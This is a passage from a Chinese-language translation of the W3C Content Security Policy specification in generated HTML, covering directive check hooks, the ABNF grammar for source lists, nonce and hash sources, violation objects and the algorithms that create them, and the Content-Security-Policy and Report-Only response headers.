                            href="#should-block-navigation-request"
                            id="ref-for-should-block-navigation-request①">§ 4.2.4 内容安全策略是否应阻止导航请求类型？</a>
                        中执行。除非另有说明，否则它返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-navigation-response-check">导航响应检查</dfn>，其参数是一个 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request"
                            id="ref-for-concept-request③">请求</a>、一个导航类型字符串（"<code>form-submission</code>" 或
                        "<code>other</code>"），一个 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-response"
                            id="ref-for-concept-response②">响应</a>、一个 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/#navigable"
                            id="ref-for-navigable">导航目标</a>、一个检查类型字符串（"<code>source</code>" 或
                        "<code>response</code>"），以及一个 <a data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object①②">策略</a>，并在 <a
                            href="#should-block-navigation-response"
                            id="ref-for-should-block-navigation-response">§ 4.2.5 内容安全策略是否应阻止对导航请求类型的导航响应？</a>
                        中执行。除非另有说明，否则它返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-webrtc-pre-connect-check">WebRTC 预连接检查</dfn>，其参数是一个 <a data-link-type="dfn"
                            href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object①③">策略</a>，并在 <a
                            href="#should-block-rtc-connection">§ 4.3.1 是否应阻止全局的 RTC 连接？</a> 中执行。除非另有说明，否则它返回
                        "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="2.3.1" id="framework-directive-source-list"><span
                    class="secno">2.3.1. </span><span class="content">源列表</span><a class="self-link"
                    href="#framework-directive-source-list"></a></h4>
            <p>许多 <a data-link-type="dfn" href="#directives" id="ref-for-directives⑤">指令</a> 的 <a data-link-type="dfn"
                    href="#directive-value" id="ref-for-directive-value③">值</a> 由 <dfn class="dfn-paneled"
                    data-dfn-type="dfn" data-export id="source-lists">源列表</dfn> 组成：<a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set③">集合</a>的 <a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                    id="ref-for-string③">字符串</a>，用于标识可以获取并可能嵌入或执行的内容。每个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#string" id="ref-for-string④">字符串</a> 表示以下类型的 <dfn
                    class="dfn-paneled" data-dfn-type="dfn" data-export data-lt="源表达式" id="source-expression">源表达式</dfn>
                之一：</p>
            <ol>
                <li data-md>
                    <p>关键字，如 <a data-link-type="grammar" href="#grammardef-none"
                            id="ref-for-grammardef-none"><code>'none'</code></a> 和 <a data-link-type="grammar"
                            href="#grammardef-self" id="ref-for-grammardef-self②"><code>'self'</code></a>（分别表示匹配无内容和匹配当前
                        URL 的来源）</p>
                <li data-md>
                    <p>序列化 URL，如 <code>https://example.com/path/to/file.js</code>（匹配特定文件）或
                        <code>https://example.com/</code>（匹配该来源上的所有内容）
                    </p>
                <li data-md>
                    <p>协议，如 <code>https:</code>（匹配具有指定协议的任何资源）</p>
                <li data-md>
                    <p>主机，如 <code>example.com</code>（匹配该主机上的任何资源，无论协议如何）或
                        <code>*.example.com</code>（匹配该主机的所有子域（以及任何子域的子域，依此类推）上的任何资源）
                    </p>
                <li data-md>
                    <p>随机数，如 <code>'nonce-ch4hvvbHDpv7xCSvXCs3BrNggHdTzxUA'</code>（可以匹配页面上的特定元素）</p>
                <li data-md>
                    <p>摘要，如 <code>'sha256-abcd...'</code>（可以匹配页面上的特定元素）</p>
            </ol>
            <p>一个<dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-source-list">序列化的源列表</dfn>是一个<a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string④">ASCII 字符串</a>，由以空格分隔的一系列<a data-link-type="dfn" href="#source-expression"
                    id="ref-for-source-expression①">源表达式</a>组成，遵循以下 ABNF 语法 <a data-link-type="biblio"
                    href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>：</p>
            <pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-source-list">serialized-source-list</dfn> = ( <a data-link-type="grammar" href="#grammardef-source-expression" id="ref-for-grammardef-source-expression">source-expression</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace②">required-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-source-expression" id="ref-for-grammardef-source-expression①">source-expression</a> ) ) / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-none">'none'</dfn>"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-source-expression">source-expression</dfn>      = <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source">scheme-source</a> / <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source">host-source</a> / <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source">keyword-source</a>
                         / <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source">nonce-source</a> / <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source">hash-source</a>

; Schemes: "https:" / "custom-scheme:" / "another.custom-scheme:"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-scheme-source">scheme-source</dfn> = <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part">scheme-part</a> ":"

; Hosts: "example.com" / "*.example.com" / "https://*.example.com:12/path/to/file.js"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-host-source">host-source</dfn> = [ <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part①">scheme-part</a> "://" ] <a data-link-type="grammar" href="#grammardef-host-part" id="ref-for-grammardef-host-part">host-part</a> [ ":" <a data-link-type="grammar" href="#grammardef-port-part" id="ref-for-grammardef-port-part">port-part</a> ] [ <a data-link-type="grammar" href="#grammardef-path-part" id="ref-for-grammardef-path-part">path-part</a> ]
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-scheme-part">scheme-part</dfn> = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.1" id="ref-for-section-3.1">scheme</a>
              ; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.1" id="ref-for-section-3.1①">scheme</a> is defined in section 3.1 of RFC 3986.
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-host-part">host-part</dfn>   = "*" / [ "*." ] 1*<a data-link-type="grammar" href="#grammardef-host-char" id="ref-for-grammardef-host-char">host-char</a> *( "." 1*<a data-link-type="grammar" href="#grammardef-host-char" id="ref-for-grammardef-host-char①">host-char</a> ) [ "." ]
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-host-char">host-char</dfn>   = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑦">ALPHA</a> / <a data-link-type="grammar" data-refhint-key="3060c9b4" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑧">DIGIT</a> / "-"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-port-part">port-part</dfn>   = 1*<a data-link-type="grammar" data-refhint-key="3060c9b4" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑨">DIGIT</a> / "*"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-path-part">path-part</dfn>   = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.3" id="ref-for-section-3.3">path-absolute</a> (but not including ";" or ",")
              ; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.3" id="ref-for-section-3.3①">path-absolute</a> is defined in section 3.3 of RFC 3986.

; Keywords:
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-keyword-source">keyword-source</dfn> = "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-self">'self'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-inline">'unsafe-inline'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-eval">'unsafe-eval'</dfn>"
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-strict-dynamic">'strict-dynamic'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-hashes">'unsafe-hashes'</dfn>"
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-report-sample">'report-sample'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-unsafe-allow-redirects">'unsafe-allow-redirects'</dfn>"
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-wasm-unsafe-eval">'wasm-unsafe-eval'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-trusted-types-eval">'trusted-types-eval'</dfn>"
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-report-sha256">'report-sha256'</dfn>" / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-report-sha384">'report-sha384'</dfn>"
                 / "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-report-sha512">'report-sha512'</dfn>"

ISSUE: Bikeshed <code>unsafe-allow-redirects</code>.

; Nonces: 'nonce-[nonce goes here]'
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-nonce-source">nonce-source</dfn>  = "'nonce-" <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value">base64-value</a> "'"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-base64-value">base64-value</dfn>  = 1*( <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1①⓪">ALPHA</a> / <a data-link-type="grammar" data-refhint-key="3060c9b4" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1①①">DIGIT</a> / "+" / "/" / "-" / "_" )*2( "=" )

; Digests: 'sha256-[digest goes here]'
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-hash-source">hash-source</dfn>    = "'" <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm">hash-algorithm</a> "-" <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value①">base64-value</a> "'"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-hash-algorithm">hash-algorithm</dfn> = "sha256" / "sha384" / "sha512"
</pre>
            <p><a data-link-type="grammar" href="#grammardef-host-char" id="ref-for-grammardef-host-char②">host-char</a>
                规则有意仅包含 ASCII 字符；国际化域名不能直接作为 <a data-link-type="dfn" href="#serialized-csp"
                    id="ref-for-serialized-csp①">序列化的 CSP</a> 的一部分，而必须使用 Punycode 编码 <a data-link-type="biblio"
                    href="#biblio-rfc3492"
                    title="Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA)">[RFC3492]</a>。例如，域名
                <code>üüüüüü.de</code> 必须表示为 <code>xn--tdaaaaaa.de</code>。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span>虽然 IP 地址与上述语法匹配，但只有 <code>127.0.0.1</code>
                实际上会在用作源表达式时匹配 URL（有关详细信息，请参阅 <a href="#match-url-to-source-list">§ 6.7.2.7 在来源和重定向计数中 URL
                    是否匹配源列表？</a>）。IP 地址的安全特性存在问题，作者应尽量优先选择主机名。</p>
            <p class="note" role="note"><span class="marker">注意：</span><a data-link-type="grammar"
                    href="#grammardef-base64-value" id="ref-for-grammardef-base64-value②">base64-value</a> 语法允许 <a
                    data-link-type="dfn" href="https://tools.ietf.org/html/rfc4648#section-4"
                    id="ref-for-section-4">base64</a> 和 <a data-link-type="dfn"
                    href="https://tools.ietf.org/html/rfc4648#section-5" id="ref-for-section-5">base64url</a> 编码。这些编码在处理
                <a data-link-type="grammar" href="#grammardef-hash-source"
                    id="ref-for-grammardef-hash-source①">hash-source</a> 值时被视为等同。然而，随机数是严格的字符串匹配：我们使用 <a
                    data-link-type="grammar" href="#grammardef-base64-value"
                    id="ref-for-grammardef-base64-value③">base64-value</a>
                语法来限制可用字符，并降低服务器端操作人员的复杂性（编码等），但用户代理实际上并不关心任何底层值，也不会对 <a data-link-type="grammar"
                    href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source①">nonce-source</a> 值进行任何解码。
            </p>
            <h3 class="heading settled" data-level="2.4" id="framework-violation"><span class="secno">2.4. </span><span
                    class="content">违反</span><a class="self-link" href="#framework-violation"></a></h3>
            <p>一个 <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="violation">违反</dfn> 表示一项操作或资源违反了与某个 <a
                    data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                    id="ref-for-global-object①">全局对象</a> 关联的 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object①④">策略</a> 对象集合。
            </p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation">违反</a> 都有一个 <dfn class="dfn-paneled"
                    data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-global-object">全局对象</dfn>，它是被违反策略的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                    id="ref-for-global-object②">全局对象</a>。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①">违反</a> 都有一个 <dfn class="dfn-paneled"
                    data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-url">URL</dfn>，它是其 <a
                    data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object">全局对象</a> 的
                <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url">URL</a></code>。
            </p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation②">违反</a> 都有一个 <dfn class="dfn-paneled"
                    data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-status">状态</dfn>，它是一个非负整数，表示实例化全局对象的资源的 HTTP 状态码。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation③">违反</a> 都有一个 <dfn class="dfn-paneled"
                    data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-resource">资源</dfn>，它可以是
                null、"<code>inline</code>"、"<code>eval</code>"、"<code>wasm-eval</code>"、"<code>trusted-types-policy</code>"、"<code>trusted-types-sink</code>"
                或 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url①">URL</a></code>。它表示违反策略的资源。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> <a data-link-type="dfn" href="#violation"
                    id="ref-for-violation④">违反</a> 的 <a data-link-type="dfn" href="#violation-resource"
                    id="ref-for-violation-resource">资源</a> 的值为 null 仅在违反被填充时允许。在 <a data-link-type="dfn"
                    href="#violation" id="ref-for-violation⑤">违反</a> 被报告并使用其 <a data-link-type="dfn"
                    href="#violation-resource" id="ref-for-violation-resource①">资源</a> <a
                    href="#obtain-violation-blocked-uri">获取被阻止的 URI</a> 时，<a data-link-type="dfn" href="#violation"
                    id="ref-for-violation⑥">违反</a> 的 <a data-link-type="dfn" href="#violation-resource"
                    id="ref-for-violation-resource②">资源</a> 应填充为 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url②">URL</a></code>
                或允许的字符串之一。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation⑧">违反</a> 都有一个 <dfn class="dfn-paneled"
                    data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-referrer">引用者</dfn>，它可以是 null
                或 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url③">URL</a></code>。它表示被违反策略的资源的引用者。
            </p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation⑨">违反</a> 都有一个 <dfn class="dfn-paneled"
                    data-dfn-for="violation" data-dfn-type="dfn" data-export id="violation-policy">策略</dfn>，它是被违反的 <a
                    data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object①⑥">策略</a>。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①⓪">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-disposition">处置</dfn>，它是被违反的 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑦">策略</a> 的 <a
                    data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition④">处置</a>。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①①">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-effective-directive">有效指令</dfn>，它是一个非空字符串，表示导致违反的 <a data-link-type="dfn"
                    href="#directives" id="ref-for-directives⑥">指令</a>。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①②">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-source-file">源文件</dfn>，它可以是 null 或 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url④">URL</a></code>。
            </p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①③">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-line-number">行号</dfn>，它是一个非负整数。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①④">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-column-number">列号</dfn>，它是一个非负整数。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑤">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-element">元素</dfn>，它可以是 null 或一个元素。</p>
            <p>每个 <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑥">违反</a> 都有一个 <dfn
                    class="dfn-paneled" data-dfn-for="violation" data-dfn-type="dfn" data-export
                    id="violation-sample">示例</dfn>，它是一个字符串。除非另有规定，它默认为空字符串。</p>
            <p class="note" role="note"><span class="marker">注意：</span> <a data-link-type="dfn" href="#violation"
                    id="ref-for-violation①⑦">违反</a> 的 <a data-link-type="dfn" href="#violation-sample"
                    id="ref-for-violation-sample①">示例</a> 将包含导致违反的内联脚本、事件处理程序或样式的前 40 个字符。从外部文件引发的违反将不会在违反报告中包含示例。</p>
            <h4 class="heading settled algorithm" data-algorithm="为 global、policy 和 directive 创建违反对象" data-level="2.4.1"
                id="create-violation-for-global"><span class="secno">2.4.1. </span><span class="content">为
                    <var>global</var>、<var>policy</var> 和 <var>directive</var> 创建违反对象</span><a class="self-link"
                    href="#create-violation-for-global"></a></h4>
            <p>给定一个 <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                    id="ref-for-global-object③">全局对象</a> <var>global</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑧">策略</a>
                <var>policy</var>，以及一个 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                    id="ref-for-string⑤">字符串</a> <var>directive</var>，以下算法创建一个新的 <a data-link-type="dfn"
                    href="#violation" id="ref-for-violation①⑧">违反</a> 对象，并用初始数据集进行填充：
            </p>
            <ol>
                <li data-md>
                    <p>让 <var>violation</var> 成为一个新的 <a data-link-type="dfn" href="#violation"
                            id="ref-for-violation①⑨">违反</a>，其 <a data-link-type="dfn" href="#violation-global-object"
                            id="ref-for-violation-global-object①">全局对象</a> 为 <var>global</var>，<a data-link-type="dfn"
                            href="#violation-policy" id="ref-for-violation-policy">策略</a> 为 <var>policy</var>，<a
                            data-link-type="dfn" href="#violation-effective-directive"
                            id="ref-for-violation-effective-directive">有效指令</a> 为 <var>directive</var>，并且 <a
                            data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource③">资源</a> 为
                        null。</p>
                <li data-md>
                    <p>如果用户代理当前正在执行脚本，且可以从 <var>global</var> 提取源文件的 URL、行号和列号，则相应设置 <var>violation</var> 的 <a
                            data-link-type="dfn" href="#violation-source-file"
                            id="ref-for-violation-source-file">源文件</a>、<a data-link-type="dfn"
                            href="#violation-line-number" id="ref-for-violation-line-number">行号</a> 和 <a
                            data-link-type="dfn" href="#violation-column-number"
                            id="ref-for-violation-column-number">列号</a>。</p>
                    <p class="issue" id="issue-ee968c9a"><a class="self-link" href="#issue-ee968c9a"></a>
                        这种情况是否在其他地方有规范？我在 <a data-link-type="biblio" href="#biblio-ecma262"
                            title="ECMAScript® Language Specification">[ECMA262]</a> 中没有看到类似内容。</p>
                    <p class="note" role="note"><span class="marker">注意：</span> 用户代理需要确保 <a data-link-type="dfn"
                            href="#violation-source-file" id="ref-for-violation-source-file①">源文件</a> 是页面请求的
                        URL（重定向前的）。如果这不可能，用户代理需要将 URL 降级为一个源，避免非故意泄漏。</p>
                <li data-md>
                    <p>如果 <var>global</var> 是一个 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window">Window</a></code>
                        对象，则将 <var>violation</var> 的 <a data-link-type="dfn" href="#violation-referrer"
                            id="ref-for-violation-referrer">referrer</a> 设置为 <var>global</var> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window"
                            id="ref-for-concept-document-window">document</a> 的 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer" id="ref-for-dom-document-referrer">referrer</a></code>。
                    </p>
                <li data-md>
                    <p>设置 <var>violation</var> 的 <a data-link-type="dfn" href="#violation-status"
                            id="ref-for-violation-status">状态</a> 为与 <var>violation</var> 的 <a data-link-type="dfn"
                            href="#violation-global-object" id="ref-for-violation-global-object②">全局对象</a> 关联的资源的 HTTP
                        状态码。</p>
                    <p class="issue" id="issue-d43ce829"><a class="self-link" href="#issue-d43ce829"></a>
                        我们具体如何获取状态码？我们并没有实际将其存储在任何地方。</p>
                <li data-md>
                    <p>返回 <var>violation</var>。</p>
            </ol>
            <h4 class="heading settled algorithm" data-algorithm="为 request 和 policy 创建违反对象" data-level="2.4.2"
                id="create-violation-for-request"><span class="secno">2.4.2. </span><span class="content">为
                    <var>request</var> 和 <var>policy</var> 创建违反对象</span><a class="self-link"
                    href="#create-violation-for-request"></a></h4>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object①⑨">策略</a>
                <var>policy</var>，以下算法创建一个新的 <a data-link-type="dfn" href="#violation" id="ref-for-violation②⓪">违反</a>
                对象，并用初始数据集进行填充：
            </p>
            <ol>
                <li data-md>
                    <p>让 <var>directive</var> 成为在 <var>request</var> 上执行 <a
                            href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 的结果。</p>
                <li data-md>
                    <p>让 <var>violation</var> 成为在 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-client"
                            id="ref-for-concept-request-client">客户端</a> 的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"
                            id="ref-for-concept-settings-object-global">全局对象</a>、<var>policy</var> 和
                        <var>directive</var> 上执行 <a href="#create-violation-for-global">§ 2.4.1 为 global、policy 和
                            directive 创建违反对象</a> 的结果。
                    </p>
                <li data-md>
                    <p>设置 <var>violation</var> 的 <a data-link-type="dfn" href="#violation-resource"
                            id="ref-for-violation-resource④">资源</a> 为 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-url"
                            id="ref-for-concept-request-url">URL</a>。</p>
                    <p class="note" role="note"><span class="marker">注意：</span>我们使用 <var>request</var> 的 <a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url"
                            id="ref-for-concept-request-url①">URL</a>，而不是其 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-current-url"
                            id="ref-for-concept-request-current-url">当前 URL</a>，因为后者可能包含页面不应访问的重定向目标信息。</p>
                <li data-md>
                    <p>返回 <var>violation</var>。</p>
            </ol>
        </section>
        <section>
            <h2 class="heading settled" data-level="3" id="policy-delivery"><span class="secno">3. </span><span
                    class="content">策略传递</span><a class="self-link" href="#policy-delivery"></a></h2>
            <p>服务器可以通过 HTTP 响应头字段为特定的<a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object②⓪">资源表示</a>声明<a data-link-type="dfn"
                    href="#serialized-csp" id="ref-for-serialized-csp②">序列化 CSP</a>，详细机制在 <a href="#csp-header">§ 3.1
                    Content-Security-Policy HTTP 响应头字段</a>和 <a href="#cspro-header">§ 3.2
                    Content-Security-Policy-Report-Only HTTP 响应头字段</a>中定义，与 Fetch 和 HTML 的集成描述在 <a
                    href="#fetch-integration">§ 4.1 Fetch 集成</a>和 <a href="#html-integration">§ 4.2 HTML 集成</a>中。</p>
            <p>策略也可以通过 HTML 文档中的
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta">meta</a></code>
                元素的
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv" id="ref-for-attr-meta-http-equiv">http-equiv</a></code>
                属性内联声明，如 <a href="#meta-element">§ 3.3 &lt;meta> 元素</a>所述。
            </p>

            <h3 class="heading settled" data-level="3.1" id="csp-header"><span class="secno">3.1. </span><span
                    class="content"> <code>Content-Security-Policy</code> HTTP 响应头字段</span><a class="self-link"
                    href="#csp-header"></a></h3>
            <p><dfn class="dfn-paneled" data-dfn-type="http-header" data-export
                    id="header-content-security-policy"><code>Content-Security-Policy</code></dfn> HTTP
                响应头字段是将策略从服务器传递到客户端的首选机制。该头字段的值由以下 ABNF 表示 <a data-link-type="biblio" href="#biblio-rfc5234"
                    title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>：</p>
            <pre>Content-Security-Policy = 1#<a data-link-type="grammar" href="#grammardef-serialized-policy" id="ref-for-grammardef-serialized-policy①">serialized-policy</a>
                ; "#" 规则定义于 RFC 9110 的第 5.6.1 节，
                ; 并包括本文档第 2.1 节中的修改。
            </pre>
            <div class="example" id="example-b2d2c295">
                <a class="self-link" href="#example-b2d2c295"></a>
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①">Content-Security-Policy</a>: script-src 'self';
                     report-to csp-reporting-endpoint
                </pre>
            </div>
            <p>服务器可以为同一资源的不同<a data-link-type="dfn" data-refhint-key="b1744823"
                    href="https://tools.ietf.org/html/rfc9110#section-3.2" id="ref-for-section-3.2①">表示形式</a>发送不同的
                <code>Content-Security-Policy</code> 标头字段值。
            </p>
            <p>当用户代理收到 <code>Content-Security-Policy</code> 标头字段时，它必须按照 <a href="#fetch-integration">§ 4.1 与 Fetch
                    集成</a>和 <a href="#html-integration">§ 4.2 与 HTML 集成</a>中的描述，<a data-link-type="abstract-op"
                    href="#abstract-opdef-parse-a-serialized-csp"
                    id="ref-for-abstract-opdef-parse-a-serialized-csp②">解析</a>并<a data-link-type="dfn" href="#enforced"
                    id="ref-for-enforced">强制执行</a>其中包含的每个<a data-link-type="dfn" href="#serialized-csp"
                    id="ref-for-serialized-csp③">序列化 CSP</a>。
            </p>
            <h3 class="heading settled" data-level="3.2" id="cspro-header"><span class="secno">3.2. </span><span
                    class="content"><code>Content-Security-Policy-Report-Only</code> HTTP 响应头字段</span><a
                    class="self-link" href="#cspro-header"></a></h3>
            <p><dfn class="dfn-paneled" data-dfn-type="http-header" data-export
                    id="header-content-security-policy-report-only"><code>Content-Security-Policy-Report-Only</code></dfn>
                HTTP 响应头字段允许 Web 开发者通过监控（而不是执行）策略的效果来进行策略试验。该头字段的值由以下 ABNF 表示 <a data-link-type="biblio"
                    href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>：</p>
            <pre>Content-Security-Policy-Report-Only = 1#<a data-link-type="grammar" href="#grammardef-serialized-policy" id="ref-for-grammardef-serialized-policy②">serialized-policy</a>
                ; "#" 规则定义于 RFC 9110 的第 5.6.1 节，
                ; 并包括本文档第 2.1 节中的修改。
            </pre>
            <p>该头字段允许开发者以迭代的方式构建其安全策略，基于其对站点行为的最佳估计部署报告模式策略，观察违规报告，然后在对行为有足够信心后转变为强制策略。</p>
            <div class="example" id="example-5899b4f0">
                <a class="self-link" href="#example-5899b4f0"></a>
                <pre><a data-link-type="http-header" href="#header-content-security-policy-report-only" id="ref-for-header-content-security-policy-report-only">Content-Security-Policy-Report-Only</a>: script-src 'self';
                                         report-to csp-reporting-endpoint
                </pre>
            </div>
